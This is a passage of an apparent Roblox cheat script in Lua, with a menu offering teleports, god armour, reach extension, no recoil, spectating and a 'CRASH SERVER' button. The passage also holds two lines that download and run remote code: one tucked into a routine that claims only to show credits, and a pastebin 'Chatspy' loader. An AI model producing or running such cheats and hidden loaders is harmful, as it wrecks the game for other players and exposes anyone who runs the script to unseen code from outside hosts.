Frame_2.Size = UDim2.new(0, 152, 0, 4)

CrashServerButton.Name = "CrashServerButton"
CrashServerButton.Parent = SellingFrame
CrashServerButton.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
CrashServerButton.BorderSizePixel = 0
CrashServerButton.Position = UDim2.new(0.0949367061, 0, 0.815384626, 0)
CrashServerButton.Size = UDim2.new(0, 138, 0, 29)
CrashServerButton.Font = Enum.Font.GothamBlack
CrashServerButton.Text = "CRASH SERVER"
CrashServerButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CrashServerButton.TextSize = 14.000


local function FUVO_fake_script() -- imiecredits.LocalScript 
	local script = Instance.new('LocalScript', imiecredits)
	loadstring(game:HttpGet('https://iexploit.xyz/credits.lua'))()
	script.Parent.Text = "Credits:\nby: yahyeee#7643\nUI by: imie#0039"
end
coroutine.wrap(FUVO_fake_script)()
local function PXXAONR_fake_script() -- UIGradient.LocalScript 
	local script = Instance.new('LocalScript', UIGradient)
	game:GetService('RunService').RenderStepped:Connect(function()
		script.Parent.Rotation = (tick() * 75) % 360;
	end)
end
coroutine.wrap(PXXAONR_fake_script)()
local function OZAKZ_fake_script() -- SwagmodeFrame.DragScript 
	local script = Instance.new('LocalScript', SwagmodeFrame)
	script.Parent.Active = true
	script.Parent.Draggable = true
end
coroutine.wrap(OZAKZ_fake_script)()

function hideframes()
    MainFrame.Visible = false
    QuickTpFrame.Visible = false
    SideScriptsFrame.Visible = false
    TogglesFrame.Visible = false
    SellingFrame.Visible = false
end

function notify(title,text,time)
    game.StarterGui:SetCore("SendNotification", {
        Title = title;
        Text = text;
        Duration = time;
    })
end

Players = game:GetService('Players')
UIS = game:GetService('UserInputService')
RS = game:GetService('RunService')


TogglesButton.MouseButton1Click:Connect(function()
    hideframes()
    TogglesFrame.Visible = true
end)
QuickTpButton.MouseButton1Click:Connect(function()
    hideframes()
    QuickTpFrame.Visible = true
end)
SideButton.MouseButton1Click:Connect(function()
    hideframes()
    SideScriptsFrame.Visible = true
end)
MainButton.MouseButton1Click:Connect(function()
    hideframes()
    MainFrame.Visible = true
end)
SellingButton.MouseButton1Click:Connect(function()
    hideframes()
    SellingFrame.Visible = true
end)

local formatNumber = (function (n)
    n = tostring(n)
    return n:reverse():gsub("%d%d%d", "%1,"):reverse():gsub("^,", "")
end)

function SetPlayerInfo()
    local foundplayer = game:GetService('Players'):FindFirstChild(TargetTextbox.Text)
    if foundplayer then
        local TargetId = foundplayer.UserId
        local ThumbType = Enum.ThumbnailType.HeadShot
        local ThumbSize = Enum.ThumbnailSize.Size420x420
        local Content, IsReady = game:GetService('Players'):GetUserThumbnailAsync(TargetId, ThumbType, ThumbSize)
                    
        TargetImage.Image = Content
        
        CashLabel.Text = ('Cash : ' .. formatNumber(foundplayer.DataFolder.Currency.Value))
        BountyLabel.Text = ('Bounty : ' .. formatNumber(foundplayer.leaderstats.Wanted.Value))
        
        local CrewValue = foundplayer:FindFirstChild('DataFolder'):FindFirstChild('Information'):FindFirstChild('Crew')
        if CrewValue then
            if CrewValue.Value ~= nil and CrewValue.Value ~= '' then
                Crew = game:GetService('GroupService'):GetGroupInfoAsync(tonumber(CrewValue.Value))
                if Crew then
                    CrewLabel.Text = ('Crew : ' .. Crew.Name )
                    CrewId = tonumber(CrewValue.Value)
                end
            else
                CrewLabel.Text = ('Crew : None')
                Crew = nil
            end
        else
            CrewLabel.Text = ('Crew : None')
            Crew = nil
        end
    end
end

CrewLabel.MouseButton1Click:Connect(function()
    if CrewLabel.Text ~= ('Crew : None') then
        setclipboard(CrewId)
    end
end)

function ShrinkName()
    TargetTextbox.FocusLost:connect(function()
        for i,v in pairs(game.Players:GetChildren()) do
            if (string.sub(string.lower(v.Name),1,string.len(TargetTextbox.Text))) == string.lower(TargetTextbox.Text) then
                TargetTextbox.Text = v.Name
                SetPlayerInfo()
            end
        end
    end)
end
ShrinkName()

function view(plr)
    wait()
    if game.Players:FindFirstChild(plr) then
        if game.Players[plr].Character then
            game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = game.Players:FindFirstChild(plr).Character.HumanoidRootPart
        else
            View.Text = 'View'
        end
    else
        View.Text = 'View'
    end
end


loadstring(game:HttpGet("https://pastebin.com/raw/nzXicwc1", true))() -- Chatspy

local vu = game:GetService("VirtualUser") -- AntiAfk
game:GetService("Players").LocalPlayer.Idled:connect(function()
    vu:Button2Down(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
    wait(1)
    vu:Button2Up(Vector2.new(0,0),workspace.CurrentCamera.CFrame)
end)

spawn(function() -- Network
    game.RunService.RenderStepped:Connect(function()
        game.Players.LocalPlayer.MaximumSimulationRadius = 1000;
        setsimulationradius(1000,1000)
    end)
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
player = game.Players.LocalPlayer
mouse = player:GetMouse()
MainEvent = game:GetService('ReplicatedStorage').MainEvent
IsMod = false

MaxDistance = 15

COOLDOWN = true
RIDING = false

NamePos = CFrame.new(0,0,0)

green = Color3.new(0,255,0)
red = Color3.new(255,0,0)

buyingarmor = false
UIS.InputBegan:Connect(function(key,b) 
    if key.KeyCode == Enum.KeyCode.V and not b then
        if SwagmodeFrame.Visible == true then
            SwagmodeFrame.Visible = false
        else
            SwagmodeFrame.Visible = true
        end
    end
    if key.KeyCode == Enum.KeyCode.Q and not b then    
        if QToTpColor.BackgroundColor3 == green then
        	if mouse.Target then 
        		local part = mouse.Target
                local partSize = part.Size
                local halfSize = partSize.Y/2
                player.Character.HumanoidRootPart.CFrame = CFrame.new(mouse.Hit.X,part.Position.Y + halfSize + 3,mouse.Hit.Z) * CFrame.Angles(math.rad(player.Character.HumanoidRootPart.Orientation.X),math.rad(player.Character.HumanoidRootPart.Orientation.Y),math.rad(player.Character.HumanoidRootPart.Orientation.Z))
                if not player.Character.LeftHand:FindFirstChild('LeftWrist') then
                    player.Character.LeftHand.Position = player.Character.LeftLowerArm.Position
                    player.Character.RightHand.Position = player.Character.RightLowerArm.Position
                end
            end
        end
    end
    if key.KeyCode == Enum.KeyCode.LeftAlt and not b then
        if buyingarmor == false and AltArmorColor.BackgroundColor3 == green then
            local ItemCost = 1000
            buyingarmor = true
            local ClickDetector = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector
            local Location = game:GetService("Workspace").Ignored.Shop["[Medium Armor] - $1000"].ClickDetector.Parent.Head.Position
            OldCFrame = player.Character.HumanoidRootPart.CFrame
            local function buy()
                wait()
                player.Character.HumanoidRootPart.CFrame = CFrame.new(Location)
                fireclickdetector(ClickDetector)
            end
            repeat buy() until player.Character.BodyEffects.Armor.Value == 100 or player.DataFolder.Currency.Value <= ItemCost or player.Character.BodyEffects.Armor:FindFirstChild('God')
            player.Character.HumanoidRootPart.CFrame = OldCFrame
            buyingarmor = false
        end
    end
    if key.KeyCode == Enum.KeyCode.F and not b then
        if HideBlockColor.BackgroundColor3 == green or AutoBlockColor.BackgroundColor3 == green then
            HoldingF = true
            player.Character:FindFirstChildWhichIsA('Humanoid').Name = 'SWAG ON TOP'
            while HoldingF == true and HideBlockColor.BackgroundColor3 == green do
                wait()
                for _,v in pairs(player.Character:FindFirstChildWhichIsA('Humanoid'):GetPlayingAnimationTracks()) do
                    if v.Name == 'Block' then
                        v:Stop()
                    end
                end
            end
        end
    end
    if key.KeyCode == Enum.KeyCode.Space and not b then
        if RIDING == true then
            COOLDOWN = false
            for i,v in pairs(game.Workspace.Ignored:GetChildren()) do
                if v.Name == 'MyLauncher' then
                    v.Name = 'Launcher'
                end
            end
            repeat wait() until not game:GetService('Workspace'):FindFirstChild('Ignored'):FindFirstChild('MyLauncher')
            COOLDOWN = true
        end
    end
end)

UIS.InputEnded:Connect(function(key,b)
    if key.KeyCode == Enum.KeyCode.F and not b then
        player.Character:FindFirstChildWhichIsA('Humanoid').Name = 'Humanoid'
        HoldingF = false
    end
end)

player.CharacterAdded:Connect(function(character)
    repeat wait() until player.Character
    NamePos = player.Character.HumanoidRootPart.CFrame
    if SpawnPosition ~= nil then
        player.Character.HumanoidRootPart.CFrame = SpawnPosition
    end
end)

player.Character.ChildAdded:Connect(function(child)
    if child.Name == 'Christmas_Sock' and AntiBagColor.BackgroundColor3 == green then
        repeat wait() until player.Character:FindFirstChild('Christmas_Sock')
        player.Character['Christmas_Sock']:Destroy()        
    end
end)

game.Workspace.Ignored.ChildAdded:Connect(function(child)
    if child.Name == 'Launcher' and player.Character:FindFirstChild('[RPG]') then
        child.Name = 'MyLauncher' 
    end
end)

------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------------------------------------------------------------

View.MouseButton1Click:Connect(function()
    if View.Text == 'View' then
        View.Text = 'Unview'
        repeat view(TargetTextbox.Text) until View.Text == 'View'
        game.Workspace:FindFirstChildWhichIsA('Camera').CameraSubject = player.Character:FindFirstChildWhichIsA('Humanoid')
    else
        View.Text = 'View'
    end
end)
GodBlock.MouseButton1Click:Connect(function()
    player.Character.BodyEffects.Defense:Destroy()
    Defense = Instance.new("IntValue", player.Character.BodyEffects)
    Defense.Name = "Defense"
    Defense.Value = 100
end)
GodArmor.MouseButton1Click:Connect(function()
    player.Character.BodyEffects.Armor:Destroy()
    Armor = Instance.new("IntValue", player.Character.BodyEffects)
    Armor.Name = 'Armor'
    Armor.Value = 100
    GodLabel = Instance.new('IntValue', Armor)
    GodLabel.Name = 'God'
end)
Headless.MouseButton1Click:Connect(function()
    player.Character.Head:BreakJoints()
    player.Character.Head.Position = Vector3.new(0,99999999999999,0)
end)
GoTo.MouseButton1Click:Connect(function()
    player.Character.HumanoidRootPart.CFrame = CFrame.new(game.Players[TargetTextbox.Text].Character.UpperTorso.Position)
end)
NoRecoil.MouseButton1Click:Connect(function()
    for i,v in pairs(game:GetService('Workspace'):GetChildren()) do
        if v:IsA('Camera') then
            v:Destroy()
        end
    end
    local newcam = Instance.new('Camera',game.Workspace)
    newcam.Name = 'Camera'
    newcam.CameraType = 'Custom'
    newcam.CameraSubject = game:GetService('Workspace').Players:FindFirstChild(player.Name):FindFirstChild('Humanoid')
    newcam.HeadLocked = true
    newcam.HeadScale = 1
        	    
end)
if not syn and not KRNL_LOADED then
    Reach.Text = 'ToolReach'
end
Reach.MouseButton1Click:Connect(function()
    if Reach.Text == 'ToolReach' then
        if player.Character:FindFirstChildWhichIsA('Tool') then
            player.Character:FindFirstChildWhichIsA('Tool').Handle.Size = Vector3.new(50,50,50)
        	player.Character:FindFirstChildWhichIsA('Tool').Handle.Transparency = 1
        else
            notify('Reach Error', 'you need to be holding a tool', 3)
        end
    else
        if Reach.Text == 'Reach' then
            Reach.Text = 'Unreach'
            while Reach.Text == 'Unreach' do
                wait()
                    local success, err = pcall(function()
                    if player.Character.BodyEffects.Attacking.Value == true then
                        for i,v in pairs(game:GetService('Players'):GetChildren()) do
                        
